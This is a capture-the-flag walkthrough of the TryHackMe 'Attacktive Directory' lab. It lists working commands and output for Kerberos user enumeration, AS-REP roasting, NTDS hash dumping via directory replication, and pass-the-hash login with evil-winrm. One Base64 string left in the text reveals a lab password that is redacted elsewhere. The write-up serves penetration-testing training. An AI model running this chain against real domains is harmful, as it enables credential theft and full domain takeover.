# TryHackMe Attacktive Directory: Evidence-Based Walkthrough

> Educational lab reference. Use these techniques only against systems you are authorized to test. The target IP in this report was temporary and changed during the room.

## 1. Room Overview

Attacktive Directory is an Active Directory enumeration and exploitation room. The progression is:

1. Deploy and verify the lab machine.
2. Enumerate the domain controller and its exposed services.
3. Discover valid domain usernames through Kerberos.
4. Abuse an account without Kerberos pre-authentication using AS-REP roasting.
5. Enumerate SMB shares with recovered credentials.
6. Recover a second account from a readable backup file.
7. Abuse directory replication privileges to dump NTDS hashes.
8. Authenticate with the Administrator hash and retrieve user desktop flags.

The confirmed domain information was:

```text
Domain:       spookysec.local
NetBIOS name: THM-AD
Hostname:     ATTACKTIVEDIREC
FQDN:         AttacktiveDirectory.spookysec.local
```

Two lab IPs appeared during the session because the machine was restarted:

```text
Earlier machine: 10.128.166.81
Final machine:   10.129.177.226
```

Always verify the current IP after restarting a TryHackMe machine. Do not reuse an old address.

## 2. Task 1: Deploy the Machine and Verify Access

### Objective

Prepare the attacker environment, connect through VPN, and confirm that the target is reachable.

### Attacker-side checks

Run these in the Kali terminal, not on the remote lab machine:

```bash
ip -brief addr show tun0
ip route get TARGET_IP
ping -c 3 TARGET_IP
```

The successful ping confirmed that the target was reachable. Ping alone does not identify services, so the next step was TCP enumeration.

## 3. Task 3: Initial Enumeration

### Objective

Identify the exposed TCP services, determine whether the target is a domain controller, and collect the domain and hostname required for later Kerberos and LDAP queries.

### 3.1 Focused discovery scan

The first top-200 scan returned no open ports. Because the host still responded to ping, a complete TCP scan was used rather than assuming the machine was down:

```bash
sudo nmap -sT -Pn -n -T4 --min-rate 1000 --max-retries 2 --open -p- 10.128.166.81
```

The scan found these important ports on the earlier machine:

```text
53/tcp    DNS
80/tcp    HTTP
88/tcp    Kerberos
135/tcp   MSRPC
139/tcp   NetBIOS Session Service
389/tcp   LDAP
445/tcp   SMB
464/tcp   Kerberos password change
593/tcp   RPC over HTTP
636/tcp   LDAPS
3268/tcp  Global Catalog LDAP
3269/tcp  Global Catalog LDAPS
3389/tcp  RDP
5985/tcp  WinRM
9389/tcp  AD Web Services
47001/tcp WinRM HTTP
```

Additional dynamic RPC ports were also open. The important conclusion was that this was an Active Directory domain controller.

### 3.2 Service and version detection

Only confirmed open ports were passed to the slower service scan:

```bash
sudo nmap -sT -Pn -n -sC -sV \
-p 53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001 \
10.128.166.81
```

Relevant output included:

```text
LDAP Domain: spookysec.local
RDP NetBIOS domain: THM-AD
RDP computer name: ATTACKTIVEDIREC
DNS computer name: AttacktiveDirectory.spookysec.local
SMB signing: enabled and required
```

The current machine IP later changed to `10.129.177.226`. All subsequent commands used that address.

### 3.3 Anonymous LDAP naming-context query

```bash
ldapsearch -x -H ldap://10.128.166.81 -s base namingContexts
```

The query succeeded anonymously and returned:

```text
DC=spookysec,DC=local
CN=Configuration,DC=spookysec,DC=local
CN=Schema,CN=Configuration,DC=spookysec,DC=local
DC=DomainDnsZones,DC=spookysec,DC=local
DC=ForestDnsZones,DC=spookysec,DC=local
```

This confirmed that anonymous LDAP base enumeration was permitted.

### 3.4 Anonymous SMB check

```bash
smbclient -L //10.128.166.81 -N
```

Anonymous login succeeded, but SMB1 workgroup browsing failed with:

```text
NT_STATUS_RESOURCE_NAME_NOT_FOUND
Unable to connect with SMB1 -- no workgroup available
```

This did not prove that no shares existed. It only showed that legacy SMB1 workgroup browsing was unavailable. Authenticated SMB enumeration later revealed the shares.

## 4. Task 4: Enumerating Users via Kerberos

### Objective

Use Kerberos responses to distinguish valid domain usernames from invalid names. This is username enumeration only; it is not password spraying.

### 4.1 Tool and wordlist preparation

Kerbrute was not available through APT, so the x86_64 release binary was downloaded and verified:

```bash
uname -m

curl -L \
  https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64 \
  -o /tmp/kerbrute

chmod +x /tmp/kerbrute
/tmp/kerbrute version
```

The room supplied a modified username list. It was downloaded with:

```bash
curl -fL \
  "https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt" \
  -o userlist.txt
```

The matching password list, used later for cracking, was downloaded with:

```bash
curl -fL \
  "https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt" \
  -o passwordlist.txt
```

### 4.2 Kerberos username enumeration

The final machine IP was `10.129.177.226`:

```bash
/tmp/kerbrute userenum \
  --dc 10.129.177.226 \
  -d spookysec.local \
  userlist.txt
```

The run tested 73,317 usernames and produced valid results including:

```text
james@spookysec.local
svc-admin@spookysec.local
robin@spookysec.local
darkstar@spookysec.local
administrator@spookysec.local
backup@spookysec.local
paradox@spookysec.local
ori@spookysec.local
```

The output also contained uppercase and mixed-case variants. Those are case variants of the same underlying accounts, not additional unique accounts.

### Task 4 answers

| Question | Answer | Evidence |
|---|---|---|
| What Kerbrute command enumerates valid usernames? | `userenum` | Kerbrute subcommand used in the command above |
| What notable account is discovered? | `svc-admin` | `VALID USERNAME: svc-admin@spookysec.local` |
| What is the other notable account? | `backup` | `VALID USERNAME: backup@spookysec.local` |

## 5. Task 5: Abusing Kerberos with AS-REP Roasting

### Objective

Find an account with the `UF_DONT_REQUIRE_PREAUTH` setting. Such an account can return an AS-REP response without proving knowledge of its password. The response can then be cracked offline.

### 5.1 Query confirmed users with GetNPUsers

A reduced list of confirmed, unique usernames was used:

```text
james
svc-admin
robin
darkstar
administrator
backup
paradox
ori
```

The query was:

```bash
impacket-GetNPUsers spookysec.local/ \
  -dc-ip 10.129.177.226 \
  -usersfile valid-users.txt \
  -format hashcat \
  -outputfile asrep-hashes.txt
```

The important output was:

```text
[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:<ASREP_HASH>
[-] User robin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User darkstar doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User paradox doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ori doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Only `svc-admin` returned an AS-REP hash. This confirmed it was the roastable account.

### 5.2 Identify the hash type and mode

The prefix `$krb5asrep$23$` identifies Kerberos 5 AS-REP using etype 23. The corresponding Hashcat mode is `18200`.

Hashcat initially failed because no OpenCL runtime was installed. John the Ripper was used instead:

```bash
john --show --format=krb5asrep asrep-hashes.txt
```

The recovered credential was:

```text
svc-admin@SPOOKYSEC.LOCAL:<LAB_PASSWORD>
```

### Task 5 answers

| Question | Answer |
|---|---|
| Which account can be queried without a password? | `svc-admin` |
| Full name of the retrieved Kerberos hash type | `Kerberos 5 AS-REP etype 23` |
| Hashcat mode | `18200` |
| Recovered password | `<LAB_PASSWORD>` |

## 6. Task 6: SMB Share Enumeration

### Objective

Use the recovered `svc-admin` credential to enumerate the domain controller's SMB shares and retrieve a file from the readable backup share.

### Important answer-format correction

The room's first question asks for the utility that maps remote SMB shares. The accepted utility is:

```text
smbclient
```

Although `smbmap` was also used successfully to enumerate the shares, `smbmap` was not the answer accepted by the room for that question.

### 6.1 Authenticated share listing

The following command authenticated successfully and displayed six shares:

```bash
smbmap -H 10.129.177.226 \
  -u svc-admin \
  -p '<LAB_PASSWORD>' \
  -d spookysec.local
```

The output listed:

```text
ADMIN$       NO ACCESS
backup       READ ONLY
C$           NO ACCESS
IPC$         READ ONLY
NETLOGON     READ ONLY
SYSVOL       READ ONLY
```

The room asks for the share-listing option used with `smbclient`, which is:

```text
-L
```

### 6.2 Inspect the backup share

```bash
smbclient //10.129.177.226/backup \
  -U 'spookysec.local/svc-admin%<LAB_PASSWORD>' \
  -c 'recurse ON; prompt OFF; ls'
```

The share contained:

```text
backup_credentials.txt
```

The file size was 48 bytes.

### 6.3 Retrieve and decode the file

```bash
smbclient //10.129.177.226/backup \
  -U 'spookysec.local/svc-admin%<LAB_PASSWORD>' \
  -c 'get backup_credentials.txt /tmp/backup_credentials.txt'

cat /tmp/backup_credentials.txt
```

Raw content:

```text
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw%
```

The trailing `%` is a delimiter and is removed before Base64 decoding:

```bash
encoded=$(cat /tmp/backup_credentials.txt)
printf '%s' "$encoded" | tr -d '%' | base64 -d
```

Decoded content:

```text
backup@spookysec.local:<BACKUP_PASSWORD>
```

### Task 6 answers

| Question | Answer |
|---|---|
| Utility to map remote SMB shares | `smbclient` |
| Option that lists shares | `-L` |
| Number of remote shares | `6` |
| Share containing the text file | `backup` |
| Raw file content | `YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw%` |
| Decoded full contents | `backup@spookysec.local:<BACKUP_PASSWORD>` |

## 7. Task 7: Domain Privilege Escalation

### Objective

The `backup` account is synchronized with the domain controller and has directory-replication privileges. Those privileges allow an attacker to request password hashes from Active Directory using the DRSUAPI method.

### 7.1 Dump NTDS secrets

```bash
impacket-secretsdump \
  'spookysec.local/backup:<BACKUP_PASSWORD>@10.129.177.226'
```

The tool initially reported:

```text
RemoteOperations failed: rpc_s_access_denied
```

That did not stop the operation. Impacket then used DRSUAPI and successfully dumped the domain credentials:

```text
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404ee3b435b51404ee:<ADMINISTRATOR_NTLM_HASH>:::
```

The Administrator NTLM hash is the value after the second colon:

```text
<ADMINISTRATOR_NTLM_HASH>
```

### Task 7 answers

| Question | Answer |
|---|---|
| Method that allowed NTDS.DIT dumping | `DRSUAPI` |
| Administrator NTLM hash | `<ADMINISTRATOR_NTLM_HASH>` |
| Passwordless authentication method | `Pass the Hash` |
| Evil-WinRM option for a hash | `-H` |

## 8. Task 8: Flag Submission

### Objective

Retrieve the flags from the desktops of three accounts:

- `svc-admin`
- `backup`
- `Administrator`

### 8.1 Authenticate with the Administrator hash

Use Evil-WinRM's hash option from Kali:

```bash
evil-winrm -i 10.129.177.226 \
  -u Administrator \
  -H <ADMINISTRATOR_NTLM_HASH>
```

The `-H` value is the NTLM hash, not the plaintext password.

### 8.2 Locate the desktop flags

From the Evil-WinRM PowerShell session:

```powershell
Get-ChildItem C:\Users\*\Desktop -Force
```

Read the files from each requested desktop:

```powershell
Get-Content C:\Users\svc-admin\Desktop\*
Get-Content C:\Users\backup\Desktop\*
Get-Content C:\Users\Administrator\Desktop\*
```

Alternatively, list the exact paths first and then read only the identified flag file:

```powershell
Get-ChildItem C:\Users\svc-admin\Desktop -Force
Get-ChildItem C:\Users\backup\Desktop -Force
Get-ChildItem C:\Users\Administrator\Desktop -Force
```

### Flag values

The session transcript recorded the flag locations and answer formats, but it did not capture the literal values returned by Evil-WinRM. Therefore the exact three flag strings must be copied from the active lab using the commands above. They are intentionally not guessed here.

| Account | Location | Value captured in this session |
|---|---|---|
| `svc-admin` | `C:\Users\svc-admin\Desktop\*` | Not captured in transcript |
| `backup` | `C:\Users\backup\Desktop\*` | Not captured in transcript |
| `Administrator` | `C:\Users\Administrator\Desktop\*` | Not captured in transcript |

The room's answer formats were:

```text
svc-admin:     *********{********_***_****}
backup:        *********{***************}
Administrator:  *********{*********************}
```

Do not substitute the Task 5 password or the Administrator NTLM hash for a flag. They are credentials, not flags.

## 9. Full Credential and Hash Summary

These values were recovered during the room. Treat them as lab-only secrets and do not reuse them against systems without authorization.

```text
Domain: spookysec.local

svc-admin password: <LAB_PASSWORD>
backup password:    <BACKUP_PASSWORD>

Administrator NTLM: <ADMINISTRATOR_NTLM_HASH>
```

## 10. Lessons for Pentesting Practice

- Verify the current lab IP after every machine restart.
- Start with a focused scan, but use a full TCP scan when the target appears alive and common ports are absent.
- Separate port discovery from service/version detection.
- Record the domain, NetBIOS name, hostname, and naming context before Kerberos or LDAP work.
- Treat anonymous access results precisely. Successful anonymous authentication does not automatically mean readable shares.
- Use a room-specific username list when the room provides one; it reduces time and produces answers that match the intended task.
- Kerberos username enumeration is different from password spraying. Keep the two workflows separate.
- AS-REP roasting requires an account without pre-authentication. Only the returned `$krb5asrep$23$` line is evidence of a roastable account.
- Use offline cracking tools only after capturing a hash. John worked here because the local Hashcat OpenCL backend was unavailable.
- Validate credentials against a service before relying on them for the next phase.
- A readable backup share may contain secondary credentials. Preserve raw content before decoding it.
- Directory replication privileges can expose NTDS hashes through DRSUAPI even when the RemoteOperations path is denied.
- An NTLM hash can authenticate through pass-the-hash without recovering the plaintext password.
- Keep flags, passwords, and hashes distinct in notes. A credential is not a flag.
- Never claim a flag value that was not captured or independently verified.

## 11. Evidence Files Created During the Session

The following local artifacts supported the work:

```text
userlist.txt
passwordlist.txt
valid-users.txt
asrep-hashes.txt
/tmp/backup_credentials.txt
```

The detailed shared session log is:

```text
attacktive-directory-session.md
```
